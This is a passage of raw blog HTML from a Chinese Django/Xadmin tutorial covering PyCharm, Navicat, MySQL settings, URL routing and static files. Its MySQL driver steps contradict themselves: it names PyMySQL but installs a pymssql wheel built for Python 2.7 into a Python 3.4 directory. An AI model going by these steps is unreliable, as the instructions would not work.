src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/5.png"></p><blockquote><p>选择好自己的项目的解释器为我们新建的虚拟环境。 </p></blockquote><p>新建<code>project</code>-&gt;<code>djangotestProj</code> 。别忘了为我们的虚拟环境安装<code>Django</code> </p><li>检查django环境是否安装好。`interpreter</li>`<p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/6.png"></p><li>点击导航栏的`run`可以直接运行我们的django项目</li><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/7.png"></p><blockquote><p>上图说明我们的django已经安装并且可以正常运行 </p></blockquote><li>点击浏览器打开`http://127.0.0.1:8000/`进行验证。 </li><h4 id="Run-edit配置修改"><a href="#Run-edit配置修改" class="headerlink" title="Run edit配置修改"></a>Run edit配置修改</h4><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/8.png"></p><p>点击上图中<code>run edit</code> 可对Django运行时的一些设置进行修改。 </p><p>比如修改host为<code>0.0.0.0</code>，然后就可以设置监听本机ip。然后点击<code>run</code> </p><p>进入<code>cmd</code>下输入<code>ipconfig</code>查询自己的ip </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/9.png"></p><blockquote><p>例如我的是 <code>192.168.1.103</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.103:8000&#x2F;   来访问。</span><br></pre></td></tr></table></figure><br><h4 id="目录颜色不同的原因"><a href="#目录颜色不同的原因" class="headerlink" title="目录颜色不同的原因"></a>目录颜色不同的原因</h4><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/10.png"></p><p>可以看到不同的目录颜色不同。这是我们可以进行设置的，为了可以做到智能提示。 </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/11.png"></p><p>右键可以将<code>template</code>目录<code>unmark</code> </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/12.png"></p><p>可以看到上图目录是灰色的。但是我们<code>右键mark</code>为<code>source Root</code>目录，会变为蓝色。 </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/13.png"></p><blockquote><p>这意味着我们在<code>import</code>时pycharm会根据设置智能提示。 </p><p>如果不mark可能会出现很多我们在pycharm中报红色， </p><p>但是cmd确可以运行的情况。 </p></blockquote><br><h3 id="Navicat基本使用"><a href="#Navicat基本使用" class="headerlink" title="Navicat基本使用"></a>Navicat基本使用</h3><h4 id="新建连接"><a href="#新建连接" class="headerlink" title="新建连接"></a>新建连接</h4><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/14.png"></p><br><blockquote><p>点击新建一个mysql的连接。 </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/15.png"></p><blockquote><p>连接名自行设置，密码填自己安装mysql时设置的密码。 </p></blockquote><h4 id="右键新建数据库"><a href="#右键新建数据库" class="headerlink" title="右键新建数据库"></a>右键新建数据库</h4><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/16.png"></p><blockquote><p>数据库名自行设置，<code>utf-8</code> <code>utf_general_ci</code> </p><p><strong>注意：这里请与图中选择一致。否则保存中文可能出错</strong> </p></blockquote><br><h4 id="新建数据表"><a href="#新建数据表" class="headerlink" title="新建数据表"></a>新建数据表</h4><p>双击数据库<code>testdjango</code>,使他变绿，然后选中表，然后右键新建表。或使用右侧<code>新建表</code>按钮 。</p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/17.png"></p><p>输入必要的字段然后使用<code>ctrl + s</code> 进行保存并输入表名。 </p><br><h4 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h4><blockquote><p>双击表，可以展示我们的数据，这时候我们可以自行修改值。 点击左下角可以新增更多行。并且状态栏会显示一些sql语句信息 </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/18.png"></p><br><h4 id="设计表"><a href="#设计表" class="headerlink" title="设计表"></a>设计表</h4><p>右键设计表：我们可以添加字段 </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/19.png"></p><br><h4 id="sql语句查询"><a href="#sql语句查询" class="headerlink" title="sql语句查询"></a>sql语句查询</h4><p>点击查询，新建查询，我们可以输入sql语句进行查询。</p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/20.png"></p><br><h4 id="表的复制黏贴和数据库传输、数据库导入导出"><a href="#表的复制黏贴和数据库传输、数据库导入导出" class="headerlink" title="表的复制黏贴和数据库传输、数据库导入导出"></a>表的复制黏贴和数据库传输、数据库导入导出</h4><blockquote><p>Navicat支持我们把不同数据库的表之间的复制粘贴操作。</p><p> 支持数据传输：点击工具数据传输 </p></blockquote><p><strong>导出</strong>：在数据库上右键我们可以<code>转储SQL文件</code>: 可以选择只转存结构。或连带数据一起。</p><p><strong>导入</strong>：右键点击运行SQL文件。 </p><p><strong>表的操作</strong>：删除，清空等，在点击表的右键菜单里。 </p><br><h1 id="Django基础知识回顾"><a href="#Django基础知识回顾" class="headerlink" title="Django基础知识回顾"></a><center>Django基础知识回顾</center></h1><h2 id="Django目录结构"><a href="#Django目录结构" class="headerlink" title="Django目录结构"></a>Django目录结构</h2><p><strong>Django目录：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">projectname : 保存Django项目的urls,setting，uwsgi文件</span><br></pre></td></tr></table></figure><br><h3 id="django自动生成的目录"><a href="#django自动生成的目录" class="headerlink" title="django自动生成的目录"></a>django自动生成的目录</h3><p>初始化完成后的目录如下：(如果不是，那么你们可能创建的不是django项目) </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/21.png"></p><p>可以看到主目录<code>DjangoGetStarted</code>与项目目录<code>DjangoGetStarted</code> </p><blockquote><li>DjangoGetStarted(文件夹)： </li><p>&nbsp;&nbsp;1.&nbsp;setting.py: 项目全局配置文件</p><p>&nbsp;&nbsp;2.&nbsp;url.py: 主要的url配置入口</p><p>&nbsp;&nbsp;3.&nbsp;wsgi.py: Django启动文件</p><li>templates(文件夹)： 放置html文件  </li><li>manage.py： 启动Django需要的主要文件。(主要的Django命令都通过manage.py运行) </li></blockquote><h3 id="自己创建的目录"><a href="#自己创建的目录" class="headerlink" title="自己创建的目录"></a>自己创建的目录</h3><p>app是Django里一个一个应用的文件夹单位。 </p><p>通过 <code>Tools -&gt; Run manage.py Task</code>创建app： </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/22.png"></p><br><h4 id="startapp-appname"><a href="#startapp-appname" class="headerlink" title="startapp appname"></a>startapp appname</h4><p>可以看到当输入<code>startapp message</code>之后，创建了<code>message</code>应用。并存放在了：与项目目录同级目录。 </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/23.png"></p><p>这里面有红色的警告，<strong>面向强迫症解决方案是</strong>在<code>setting.py</code> 新增<code>STATIC_ROOT = &#39;/static/&#39;</code> </p><p>但其实现在还没有用到这个参数。后面用到我们再配置。(推荐自行克服强迫症) </p><br><h4 id="新建static目录"><a href="#新建static目录" class="headerlink" title="新建static目录"></a>新建static目录</h4><p>使用<code>static</code>目录来存放网站的静态文件：js，css，图片等。 </p><h4 id="新建log目录"><a href="#新建log目录" class="headerlink" title="新建log目录"></a>新建log目录</h4><p>使用<code>log</code>目录来存放网站的日志文件 </p><h4 id="新建media目录"><a href="#新建media目录" class="headerlink" title="新建media目录"></a>新建media目录</h4><p>使用<code>media</code>目录存放用户上传的图片等资源。 </p><h4 id="项目庞大而带来app过多导致文件冲突问题的解决"><a href="#项目庞大而带来app过多导致文件冲突问题的解决" class="headerlink" title="项目庞大而带来app过多导致文件冲突问题的解决"></a>项目庞大而带来app过多导致文件冲突问题的解决</h4><ol><li>新建文件夹 <code>apps</code></li><li>将<code>message</code>文件夹拖入<code>apps</code>文件夹内：会自动生成<code>__init__.py</code>文件表明这是一个包。使得apps文件夹可导入。</li></ol><blockquote><p>这时我们就会发现在导入我们的message的内容就得配置较长的路径。 </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/24.png"></p><blockquote><p>每次前面都得加上<code>apps.</code>，这可烦死人啦 。</p></blockquote><br><p><strong>解决方案奉上</strong> </p><blockquote><p>将<code>apps</code>目录右键<code>mark</code>成<code>Source Root</code>(Mark 方法查看第一章pycharm简单使用：目录颜色不同的原因) </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/25.png"></p><br><p>mark成功之后<strong>变蓝</strong>(变绿的话，只能摸摸头了，当然选择原谅)，然后可以直接使用短路径进行import </p><h4 id="Mark后Pycharm-不报错，Cmd下运行报错。"><a href="#Mark后Pycharm-不报错，Cmd下运行报错。" class="headerlink" title="Mark后Pycharm 不报错，Cmd下运行报错。"></a>Mark后Pycharm 不报错，Cmd下运行报错。</h4><p>Mark后pycharm知道这是一个项目的<code>Souce Root</code>路径了，但是cmd并不知道。 </p><blockquote><p>在项目目录下通过cmd命令行使用<code>python manage.py runserver</code> </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/26.png"></p><br><blockquote><p>pycharm中mark只是pycharm自身可以进行识别短路径。 </p></blockquote><p><strong>解决方案：</strong></p><blockquote><p>我们在setting文件中配置我们的<code>apps</code>路径: </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/27.png"></p><blockquote><p>图解读：我们需要在setting中向上图一样设置,程序就会接着报错。(换了一个错误了，滑稽脸) </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.insert(0,os.path.join(BASE_DIR,&#39;apps&#39;))</span><br></pre></td></tr></table></figure><p>上述代码为将apps拼接项目绝对路径后的路径插入当前系统的环境变量path中，这样就可以成功解决(个屁屁啊)。</p><p>成功性测试(测试已失败)：</p><blockquote><p>这个import放到manage.py文件是不行的 你把manage.py中这行删除 因为django整个的配置还没有启动好 import django的model是不行的，</p></blockquote><p>插播：忘了失败吧，我偷学下面方法养你。</p><p><strong>终极解决：将这个import方法比如urls.py.等可以成功启动。</strong>或者自行删除该import。</p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/28.png"></p><p>红色警告：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have unapplied migrations; your app may not work properly </span><br><span class="line">until they are applied. Run &#39;python manage.py migrate&#39; to apply them.</span><br></pre></td></tr></table></figure><p>是因为我们没有进行数据库<code>models</code>进行初始化<code>migrate</code>.</p><p><code>python manage.py migrate</code>我们之后会用到，现在不要做。</p><br><h2 id="github仓库项目初始化第一个commit"><a href="#github仓库项目初始化第一个commit" class="headerlink" title="github仓库项目初始化第一个commit"></a>github仓库项目初始化第一个commit</h2><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/29.png"></p><blockquote><p>输入用户名密码，点击login。 </p><p>-&gt;选择左侧导航中<code>Git</code> 设置你的git.exe的路径 </p></blockquote><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/30.png"></p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">点击VCS-&gt;Import into Version Control-&gt;Share project on GitHub  会弹出一个窗口</span><br></pre></td></tr></table></figure><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/31.png"></p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/32.png"></p><p>填写你的项目<code>名称</code>，<code>描述</code>。点击<code>share</code>。</p><p>会弹窗让你选择需要上传的项目文件与commit信息。然后将项目上传至github。</p><br><p><strong>==检查是否真正的commit成功？==</strong></p><p>登陆到自己的github中，查看Your profile</p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/33.png"></p><p>如图所示commit成功，仓库连接是<a href="https://github.com/wlk-flyme/MXOline">https://github.com/wlk-flyme/MXOline</a></p><br><h2 id="配置表单页面"><a href="#配置表单页面" class="headerlink" title="配置表单页面"></a>配置表单页面</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><p>本节通过Django快速的配置一个<strong>留言板页面</strong>来学习。</p><p>Django从请求到响应的整个完整流程。为我们开发在线教育平台打下基础。 </p><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/34.png"></p><p>上图便是本节教程所要用到的静态页面:<code>form.html</code> </p><blockquote><p>具体的业务：填写信息 -&gt; 然后点击提交 -&gt;数据被存储到数据库。 </p></blockquote><p>这个<code>html</code>是一个单文件，里面已经包含了<code>css</code> <code>js</code>内容。 </p><h3 id="将html文件整合进项目操作步骤"><a href="#将html文件整合进项目操作步骤" class="headerlink" title="将html文件整合进项目操作步骤"></a>将html文件整合进项目操作步骤</h3><h4 id="将html文件直接复制进templates目录"><a href="#将html文件直接复制进templates目录" class="headerlink" title="将html文件直接复制进templates目录."></a>将<code>html</code>文件直接复制进<code>templates</code>目录.</h4><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/35.png"></p><h4 id="创建static目录下的css文件夹-和-static-js"><a href="#创建static目录下的css文件夹-和-static-js" class="headerlink" title="创建static目录下的css文件夹 和 static/js"></a>创建<code>static目录下的css文件夹</code> 和 <code>static/js</code></h4><li>在css中再新建一个`style.css` </li><p><img src="/2018/05/09/Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/36.png"></p><li>`form.html`中点击`<style>`标签左侧减号。将style内容收成一行。然后把这一行内容**剪切粘贴到**`style.css`</li><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/37.png"></p><li>黏贴进入之后，将首尾两个`style`删除，`shift+tab`可以将css格式化更整齐</li><li>在`form.html`新建`<link>`来引入css。(文件里其实已经先加上了，学一种操作而已) </li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;static&#x2F;css&#x2F;style.css&quot;&gt;</span><br></pre></td></tr></table></figure></br><h3 id="配置Django连接mysql数据库"><a href="#配置Django连接mysql数据库" class="headerlink" title="配置Django连接mysql数据库"></a>配置Django连接mysql数据库</h3><p>在<code>setting.py</code>中的<code>DATABASES</code>能够找到: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;,</span><br><span class="line">        &#39;NAME&#39;: os.path.join(BASE_DIR, &#39;db.sqlite3&#39;),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是Django默认与自己项目根目录下的<code>db.sqlite3</code>连接的设置。 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/38.png"></p><p>我们的项目是与<code>mysql</code>连接，所以我们要改成如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &quot;mxonline&quot;,</span><br><span class="line">        &#39;USER&#39;: &#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;123456&#39;,</span><br><span class="line">        &#39;HOST&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">        &#39;OPTIONS&#39;: &#123;</span><br><span class="line">            &quot;init_command&quot;: &quot;SET foreign_key_checks &#x3D; 0;&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中的<code>name</code>应设置为我们中在Navicat中新建的数据库名字。<strong>名字一定要保持一致</strong></p><p>这时要将我们之前建的表提前<strong>全部删除</strong>掉。</p><h4 id="配置mysql驱动和seeting文件。"><a href="#配置mysql驱动和seeting文件。" class="headerlink" title="配置mysql驱动和seeting文件。"></a>配置mysql驱动和seeting文件。</h4><p>点击<code>Tools 菜单下 Run manage.py Task</code>我们会发现报错了： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raise ImproperlyConfigured(&quot;Error loading MySQLdb module: %s&quot; % e)</span><br><span class="line">django.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module: No module named MySQLdb</span><br></pre></td></tr></table></figure><blockquote><p>由错误信息我们可以看出是因为没有安装数据库驱动模块<code>MySQLdb</code> </p><p>Python2装的mysql驱动驱动模块是MySQLdb</p><p>python3幢的MySQL驱动驱动模块是PyMySQL</p></blockquote><p>笔者下载的是PyMySQL。</p><p>1.下载地址<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pymssql">https://www.lfd.uci.edu/~gohlke/pythonlibs/#pymssql</a></p><p>2.请确保选择了正确文件WHL 。例如：如果您正在使用Python2.7在64位机器选择：pymssql‑2.1.1‑‑‑win_amd64.whlcp27没有。一旦你下载的文件，使WHL在C：/文件夹python27。 </p><p>3.打开cmd.exe</p><p>4.安装模块pymsql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd c:\Python3.4  </span><br><span class="line">&gt; pip install pymssql‑2.1.1‑cp27‑none‑win_amd64.whl  </span><br></pre></td></tr></table></figure></br><p>输入下面命令来生成表: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">makemigrations</span><br><span class="line">migrate</span><br></pre></td></tr></table></figure><p>这时我们去Navicat查看会发现为我们生成了很多表。 </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/39.png"></p><p>这些都是Django系统默认的<strong>内置</strong>数据表。</p><p>做完这些操作我们可以点击<code>Run</code>来运行项目，<br>然后到<code>http://127.0.0.1:8000/</code>来访问看是否运行成功。成功页面(It worked)</p></br><h3 id="配置form页面展示出来："><a href="#配置form页面展示出来：" class="headerlink" title="配置form页面展示出来："></a>配置form页面展示出来：</h3><p><code>项目名/urls.py</code>修改如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    url(r&#39;^admin&#x2F;&#39;, admin.site.urls),</span><br><span class="line">    url(r&#39;^form&#x2F;$&#39;, getform) #这行是新增加的.</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>新增加<code>url(r&#39;^form/$&#39;, getform)</code>,<code>^</code>是代表以<code>form</code>为开头，<code>$</code>代表以<code>/</code>结尾的地址。<br>这里<code>getform</code> 是对于这个<code>url</code>的相应处理的<code>view</code>。我们先去创建一个.</p><p><code>app名称/views.py</code>添加如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def getform(request):</span><br><span class="line">    return render(request, &#39;message_form.html&#39;)</span><br></pre></td></tr></table></figure><p><code>request</code> 参数是一个django的<code>http request</code>对象。(基础)<br>这里我们可以按住<code>ctrl</code> + <code>左键</code> 跟踪到我们的<code>render</code>函数里面。<br><code>Alt + 左箭头</code> 回来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def render(request, template_name,...):</span><br></pre></td></tr></table></figure><p>源代码解读：可以看到我们的<code>render</code>需要一个<code>request对象</code>和<code>template_name</code>参数</p><p><strong>注意：记性好的还记得我们提供的源文件是form.html</strong></p><blockquote><p>知识点：django内置了很多html页面，form会先从内置中寻找。所以我们得改。 </p></blockquote><p>因此我们需要右键如下图<code>Refactor</code>修改<code>from.html</code> 为<code>xxx_form</code> </p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/40.png"></p><p>如果我们的项目在运行，<code>ctrl + s</code>会自动重启我们的项目。</p><p>这时我们有了view，我们可以去配置完整的url了(前面已经配完整的检查一遍)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from message.views import getform</span><br><span class="line"></span><br><span class="line">urlpatterns &#x3D; [</span><br><span class="line">    url(r&#39;^admin&#x2F;&#39;, admin.site.urls),</span><br><span class="line">    url(r&#39;^form&#x2F;$&#39;, getform)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>这里我们不能加括号</strong><u>否则会变成</u><strong>方法的调用</strong>。</p><p>按住<code>ctrl</code> + <code>render</code> 跟踪到我们的<code>url</code>函数里面查看源码如下:可以看到它除了一组正则表达式，还需要接收一个view对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def url(regex, view,...):</span><br></pre></td></tr></table></figure><p>如果<code>getform</code>加上括号会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: getform() takes exactly 1 argument (0 given)</span><br></pre></td></tr></table></figure><p>访问<code>http://127.0.0.1:8000/</code> 正常结果：Page not found</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Using the URLconf defined in DjangoGetStarted.urls, Django tried these URL patterns, in this order:</span><br><span class="line"></span><br><span class="line">^admin&#x2F;</span><br><span class="line">^form&#x2F;$</span><br></pre></td></tr></table></figure><p>是因为我们在url中加入了个人的配置<code>^form/$</code>,它就不会采用默认配置了。</p><p>原因：(源码探究标记点)</p><p>这时访问：<a href="http://127.0.0.1:8000/form/">http://127.0.0.1:8000/form/</a></p><p>旧版本pycharm会报：<code>TemplateDoesNotExist</code>错误。我的新版本pycharm并没有出现。</p><p>重要代码在<code>settings.py</code> 60行左右</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 指明我们的templates目录路径</span><br><span class="line">&#39;DIRS&#39;: [os.path.join(BASE_DIR, &#39;templates&#39;)]</span><br><span class="line"># 老版本pycharm创建django项目该值为空。</span><br></pre></td></tr></table></figure><p>现在再次访问 <a href="http://127.0.0.1:8000/form/">http://127.0.0.1:8000/form/</a></p><p><strong>页面出来了但是样式没有。static目录下的css文件提示没有找到。</strong></p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/41.png"></p><p>Setting中静态文件的配置，这是因为我们setting中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL &#x3D; &#39;&#x2F;static&#x2F;&#39;</span><br></pre></td></tr></table></figure><p>只说明了目录的名称。并没有指明查找的根路径。添加下面代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL &#x3D; &#39;&#x2F;static&#x2F;&#39;</span><br><span class="line">STATICFILES_DIRS &#x3D; [</span><br><span class="line">    os.path.join(BASE_DIR, &#39;static&#39;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>过程中看似不停的出错</strong>，其实是为了让大家更好记住该记住的。</p><p>我们刚才是以倒序：</p><ol><li>把html文件放进来</li><li>通过简单的url配置来访问html。</li><li>发现找不到页面，所以我们设置setting中<code>DIRS</code></li><li>文件找到了又说找不到静态文件，我们设置了<code>STATICFILES_DIRS</code></li></ol><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/42.png"></p><p>这是我们的整体流程图，推荐新建一个项目再按照正向流程图来一遍。</p><p>后面我们的工作会围绕从migration生成数据表往下的内容展开。</p></br><h2 id="Django-对象关系映射ORM介绍与model设计"><a href="#Django-对象关系映射ORM介绍与model设计" class="headerlink" title="Django 对象关系映射ORM介绍与model设计"></a>Django 对象关系映射ORM介绍与model设计</h2><h3 id="原生sql-与-orm"><a href="#原生sql-与-orm" class="headerlink" title="原生sql 与 orm"></a>原生sql 与 orm</h3><p>没有ORM（Object Relational Mapping ） 的情况下views.py代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 